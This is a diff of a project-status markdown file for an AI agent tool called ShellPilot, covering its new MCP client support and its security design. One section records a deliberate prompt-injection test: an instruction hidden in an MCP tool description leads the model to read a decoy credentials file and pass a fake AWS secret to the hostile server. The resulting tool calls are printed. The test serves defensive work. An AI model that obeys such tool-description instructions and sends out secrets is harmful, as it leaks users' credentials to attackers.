@@ -4,92 +4,78 @@ Current working focus for ShellPilot. Overwrite this file as the focus shifts.
 
 ## Focus
 
-MCP client support is **specified** (spec 021) and deliberately not yet coded.
-Phase 1 of a two-phase request: design, review, then implement.
+MCP client support is **implemented and live-verified** (spec 021). ShellPilot
+can attach an MCP server and offer its tools to the model beside the built-ins.
 
-**The protocol moved, and the repository did not notice.** `000-overview.md`
-and `progress.md` both recorded "target spec revision 2025-11-25", from the
-2026-07-28 gap analysis that read `2026-07-28` as a draft. Re-fetched from the
-specification rather than recalled: **2026-07-28 is now Current**, and it is
-not a point release. The `initialize` / `initialized` handshake is **gone** in
-the modern era - the protocol is stateless, every request carries
-`_meta.io.modelcontextprotocol/protocolVersion` and `clientCapabilities`, and
-`server/discover` is a mandatory RPC that replaces capability exchange. Had the
-design been written from memory it would have implemented a handshake the
-current revision does not have.
+**The protocol had moved, and the repository had not noticed.** Both
+`000-overview.md` and `progress.md` recorded "target revision 2025-11-25", from
+a gap analysis that read `2026-07-28` as a draft. Re-fetched rather than
+recalled: **2026-07-28 is Current**, and it deleted the `initialize` handshake.
+A modern request is stateless and carries `protocolVersion` and
+`clientCapabilities` in `_meta`; `server/discover` is a mandatory RPC. Designing
+from memory would have built a handshake the current revision does not have.
 
-**So v1 is dual-era, which is cheap and non-negotiable.** Probe with
-`server/discover`; a `DiscoverResult` means modern, `-32022` means modern with
-a different version, and *any other error or a timeout* means legacy - fall
-back to `initialize`. That is the specification's own stdio rule, and the
-fallback must not be keyed to one error code. Modern-only would be useless
-today (nearly every deployed server is legacy); legacy-only would be obsolete
-on arrival.
+**So v1 is dual-era**: probe `server/discover`; a result means modern, `-32022`
+means modern-on-another-version (retry, never fall back), and *any other error
+or a timeout* means legacy. Both eras negotiated live against the same stub.
 
-**Three decisions carry the security weight, and each drops out of a protocol
-fact rather than being bolted on:**
+**The one thing that had to be measured before any code: the tool-name
+constraint.** The design assumed OpenAI's `^[a-zA-Z0-9_-]{1,64}$`. Probed by
+posting one tool definition per candidate name:
 
-- **The tool list is frozen at registration.** In the current revision,
-  `notifications/tools/list_changed` is only delivered on a
-  `subscriptions/listen` stream the client opts into. Opening none means a
-  rug-pull cannot land: a server that changes its tools after approval simply
-  does not get them offered. Not honouring `list_changed` is the control, not
-  a gap.
-- **The child environment is built, not inherited.** `Invoke-RunCommandTool`
-  inherits the parent block, and `systemPatterns.md` records that as a
-  maintainer choice that must not change silently - but that is a
-  *compatibility* argument about existing callers. An MCP child has none, so
-  it can be strict at zero migration cost. `ProcessStartInfo.Environment` is
-  cleared (it is pre-populated with the parent's), then a minimal base plus
-  exactly what the caller named.
-- **Nothing is discovered.** No scan of `.vscode/`, `~/.copilot/`, or the
-  working directory. Spec 019 already refuses to discover a policy file
-  because a discovered file *widens* reach; a discovered MCP configuration
-  file *starts a process*.
+```text
+mcp_files_read_text_file, 1mcp_tool, 64/65/128 chars   ACCEPTED
+admin.tools.list, mcp:files:read, mcp/files/read       REJECTED
+mcp files read, mcp_ünïcode_tool, 129/256 chars        REJECTED
+  -> tools.0.custom.name: String should match pattern '^[a-zA-Z0-9_-]{1,128}$'
+```
 
-**The honest admission the spec leads with:** `Set-ShpToolPolicy` **cannot**
-gate an MCP call. Its rules match resolved paths and leading command tokens; a
-`tools/call` has neither. The counter-intuitive part is stated loudly because
-a caller will assume the opposite - a policy scoping `read_file` to one
-directory does nothing about an attached filesystem server. What v1 offers
-instead is reach reduction at attachment (`-ToolName`, `-MaxTool`), which is a
-real reduction and does not pretend to be path coverage. An `Mcp()` rule kind
-is open decision 9.
+Character set right, **length wrong - 128, not 64**. Two findings justify having
+insisted: the rejection names the offending tool only by its **index** in an
+array the caller never built, and the 400 is *masked* - it sends `Invoke-Shp`
+down the `/responses` fallback, so the caller sees "model claude-opus-4.7 does
+not support Responses API", a true statement about a different problem. A name
+let through here fails a whole Turn pointing at the wrong thing.
 
-**Also settled:** stdio only (Streamable HTTP drags in OAuth 2.1, SSE and a
-fresh SSRF surface); `inputSchema` passes through unchanged with structural
-bounds only, and never a `$ref` dereference; `isError` maps onto the existing
-`@{ error = ... }` envelope so the model can self-correct, while
-`resultType: 'input_required'` is refused explicitly rather than mistaken for
-a completed call; image and audio blocks become placeholders because the tool
-channel is a string that is re-sent every round-trip; MCP calls emit the same
-`ToolCall` progress record as everything else, because a tool class invisible
-in the host's live display is not shippable.
+**Three security decisions, each falling out of a protocol fact rather than
+bolted on:**
 
-**Deliberately not measured yet.** Spec 019 shipped with a before/after table;
-this one cannot, so the measurements are written into the spec as Phase 3
-deliverables: the injection run, `Get-Process` proof that no child survives
-(including a grandchild), and the environment diff.
+- **Nothing is discovered.** Spec 019 already refuses to auto-find a policy
+  file because a discovered file widens reach; a discovered MCP config *starts
+  a process*.
+- **The tool list is frozen at registration.** `list_changed` is only delivered
+  on a `subscriptions/listen` stream the client opens. Opening none means a
+  rug-pull cannot land. Not honouring `list_changed` is the control.
+- **The child environment is built, not inherited.** `run_command` inherits the
+  parent block deliberately, but that is a *compatibility* argument about
+  existing callers; new surface has none, so it costs nothing to be strict.
+  `ProcessStartInfo.Environment` is cleared (it is pre-populated) then rebuilt.
 
-Six open decisions raised rather than guessed (8-13 in `001-open-decisions`):
-the Copilot function-name constraint (assumed to be OpenAI's 64-char
-`[A-Za-z0-9_-]` and **not verified against the proxy**), an `Mcp()` policy
-kind, MCP under `Invoke-ShpBatch` (a worker inherits nothing, so replay would
-start one server copy per worker), auto-restart, Streamable HTTP, and pinning
-a tool list across sessions.
+**The threat model is measured, not asserted.** A hostile instruction in a tool
+*description only* - nothing in the prompt:
 
-**Reviewed and accepted the same day**, with one design change. Refusing a
-configuration entry that requests `sandboxEnabled` was the wrong trade: a
-configuration written for a sandboxing host is precisely the one a caller
-wants to reuse, and the caller named the file deliberately. So the server
-starts, and the gap is made visible *twice* instead of fatal once - a warning
-naming what is not happening, plus `SandboxRequested` on the server record,
-because a warning scrolls away and a property does not. Eager start at
-registration confirmed; every 8-13 recommendation accepted as written, with
-decision 8's name-constraint probe now a Phase 2 prerequisite rather than a
-follow-up.
+```text
+-> read_file {"path":"...\\fake-credentials.txt"}
+-> mcp_notes_get_release_notes
+     {"version":"3.0.0","context":"aws_secret_access_key = DECOY-...-8891"}
+```
 
-No source file changed. Documentation only, on `ai/mcp-server-support`.
+The hostile server's own log confirms receipt. `-DisableFileAccess` read
+nothing and leaked nothing - and, unplanned, the model then gave up entirely
+rather than call the tool without the "required" context, so a hostile
+description is a denial of service on the legitimate function too.
+
+**`Set-ShpToolPolicy` cannot gate an MCP call, demonstrated in one Turn** under
+`Read(<repo>/**)`: `read_file` denied with a reason, `mcp_notes_get_release_notes`
+ran and its content reached the answer. Stated loudly because a caller will
+assume the opposite.
+
+Verified: 1035 -> 1256 tests, 0 failures; coverage 86.6%; PSScriptAnalyzer
+clean on all 20 new and changed source files (two suppressions with
+justifications, both on the private process helpers); build 9 tasks / 0 errors
+/ 0 warnings. Live: both eras end to end, the tag from a tool result reaching
+the answer, the progress record, `-DisableMcp`, no orphaned child, and the
+batch warning. Committed on `ai/mcp-server-support`.
 
 ## Superseded focus (2026-08-12) - session-token refresh
 
